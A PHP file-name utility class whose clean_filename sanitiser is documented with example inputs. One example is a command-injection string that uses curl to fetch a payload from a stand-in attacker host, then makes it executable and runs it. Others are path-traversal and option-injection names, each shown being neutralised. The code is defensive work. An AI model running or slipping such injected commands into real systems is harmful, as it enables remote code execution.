<?php

/**
 * File name utility methods.
 * 
 * @author		Tasman Hayes <tasman.hayes@gmail.com>
 * @version		$Rev: 5231 $ $xinghao $Id: CanonicalLink.php  $Date: 2009-06-02 15:34:13 +1000 (Tue, 02 Jun 2009) $
 * @package		YPEX
 * @subpackage	Controllers
 * @copyright	Copyright (c) 2009 Creagency (www.creagency.com.au)
 *
 */
class CrFramework_File_Name {

	

	/**
	 * Returns the $filename less its file extension.
	 * 
	 * e.g. strip_ext('fred.jpeg') returns 'fred'.
	 * e.g. strip_ext('fred') returns 'fred'.
	 * e.g. strip_ext('fred.') returns 'fred'.
	 * e.g. strip_ext('fred.smith.jpg') returns 'fred.smith'
	 *
	 * @author Tasman Hayes <tasman.hayes@gmail.com>
	 * @param string $filename The filename
	 * @return string The filename less any file extension (e.g. '.blah').
	 */
	public static function strip_ext($filename) {
		// Find the position of the right-most '.' in the filename.
		$dot_posn = strrpos ( $filename, '.' );
		
		// If no '.' was found, there is no extension. Return the filename unchanged.
		if ($dot_posn === FALSE)
			return $filename;
		
		return substr ( $filename, 0, $dot_posn );
	}
	
	
	
	
	
	
	
	/**
	 * Returns the file extension (the part after the '.') of the supplied filenam.
	 * 
	 * e.g. ext('fred.jpeg') returns 'jpeg'.
	 * e.g. ext('fred') returns null.
	 * e.g. ext('fred.') returns null.
	 * e.g. ext('fred.smith.jpg') returns 'jpg'
	 *
	 * @author Tasman Hayes <tasman.hayes@gmail.com>
	 * @param string $filename The filename
	 * @return string The filename's extension (the filename part after the rightmost '.'). If there is no extension, returns null.
	 */
	public static function ext($filename) {
		
		// Find the position of the right-most '.' in the filename.
		$dot_posn = strrpos ( $filename, '.' );
		
		// If no '.' was found, there is no extension. Return null.
		if ($dot_posn === FALSE)
			return null;
			
		// If the '.' is the last character in the string, there is no extension. Return null.
		if ($dot_posn == strlen ( $filename ) - 1)
			return null;
		
		return substr ( $filename, $dot_posn + 1 );
	}
	
	
	
	
	
	
	
	/**
	 * Clean up a string so it can be used as a filename.
	 *
	 * Captialization is preserved.
	 * Ampersands ('&') are changed to the word "and".
	 * Apostrophes are removed from possessives.
	 * Trailing apostrophes are removed.
	 * (All other apostrophes are later converted to underscores.)
	 * All characters besides A..Z, a..z, 0..9, '.', '-' and '_' are converted to an underscore.
	 * (Spaces are included in the characters converted to an underscore.)
	 * Several dashes in a row, or several underscores in a row, and changed to just one.
	 * Leading & trailing dashes & underscores are removed.
	 * Leading dots are removed.
	 * 
	 * clean_filename("Sex & Drugs & Rockin' Roll") = Sex_and_Drugs_and_Rockin_Roll	
	 * clean_filename("Jane's Burgers") = Janes_Burgers	
	 * clean_filename("paddington'swimming") = paddington_swimming	
	 * clean_filename("George's") = Georges	
	 * clean_filename("Mo'vida") = Mo_vida	
	 * clean_filename("Mo'Jo") = Mo_Jo	
	 * clean_filename("Mo' Jo") = Mo_Jo	
	 * clean_filename("Mo'Jo'") = Mo_Jo	
	 * clean_filename(" The Hockey Shop ") = The_Hockey_Shop	
	 * clean_filename("fred") = fred	
	 * clean_filename("fred.jpg") = fred.jpg	
	 * clean_filename("FRED") = FRED	
	 * clean_filename("fred~!@#$%^&*().smith.jpg") = fred_and_.smith.jpg	
	 * clean_filename("Fred's Plumbing Shoppe & Football Goodz") = Freds_Plumbing_Shoppe_and_Football_Goodz	
	 * clean_filename("ypex.com") = ypex.com	
	 * clean_filename("myfriends @ rose bay") = myfriends_rose_bay	
	 * clean_filename("we-like_underscores_and-dashes") = we-like_underscores_and-dashes	
	 * clean_filename("Peter Barrington-Smythe & Co.") = Peter_Barrington-Smythe_and_Co.	
	 * clean_filename("ExCITEmeNT CiTY!") = ExCITEmeNT_CiTY	
	 * clean_filename("Mr Backslash \ Enterprises") = Mr_Backslash_Enterprises	
	 * clean_filename("The Forward Slash / Company") = The_Forward_Slash_Company	
	 * clean_filename("Burlington Coat Factory (NYC Branch)") = Burlington_Coat_Factory_NYC_Branch	
	 * clean_filename(".hidden") = hidden	
	 * clean_filename(" .hidden") = hidden	
	 * clean_filename(" ..hidden") = hidden	
	 * clean_filename(" ../.hidden") = hidden	
	 * clean_filename("Solutions...") = Solutions...	
	 * clean_filename("../../../etc/apache2/apache2.conf") = etc_apache2_apache2.conf	
	 * clean_filename("My File; curl http://hack.ru/hackme >/tmp/hackme; chmod 777 /tmp/hackme; (/tmp/hackme &)") = My_File_curl_http_hack.ru_hackme_tmp_hackme_chmod_777_tmp_hackme_tmp_hackme_and	
	 * clean_filename("-kill") = kill	
	 * clean_filename("--suexec") = suexec	
	 * clean_filename("---Notice Me!---") = Notice_Me	
	 * clean_filename("___Notice_Me!___") = Notice_Me	
	 * clean_filename("_-__--suexec-_--__") = suexec	
	 * 
	 * @author Tasman Hayes <tasman.hayes@gmail.com>
	 * @param string $filename The filename to be cleaned.
	 * @return string The supplied filename cleaned to be useable as a filename (as described above).
	 */
	public static function clean_filename($filename) {
		
		// Change ampersands ('&') to the word "and".
		$filename = str_replace ( '&', 'and', $filename );
		
		// Remove apostrophes in possessives (e.g. "Jane's Burgers") .
		$filename = preg_replace ( "/'s\\b/", 's', $filename );
		
		// Remove apostrophes ("'") at the end of words (like "Rockin'") .
		// (All other apostrophes will be converted to underscores later.)
		$filename = preg_replace ( "/'\\s/", ' ', $filename );
		$filename = preg_replace ( "/'$/", '', $filename );
		
		// Replace all characters besides A..Z, a..z, 0..9, dot, dash and underscore, with an underscore.
		$filename = preg_replace ( '/[^A-Za-z0-9-_\.]/', '_', $filename );
		
		// Collapse multiple underscores and dashes to just one. Multple dots are ok.
		$filename = preg_replace ( '/_+/', '_', $filename );
		$filename = preg_replace ( '/-+/', '-', $filename );
		
		// Remove any leading dashes, dots or underscores.
		// (Leading dashes, aside from being ugly, could trigger Unix command-line switches, when files are processed with Unix utilities.)
		// (Leading dots hide the file, or could be used to access other directores.)
		$filename = preg_replace ( '/^[-_\.]+/', '', $filename );
		
		// Remove any trailing dashes or underscores.
		$filename = preg_replace ( '/[-_]+$/', '', $filename );
		
		return $filename;
	}
}
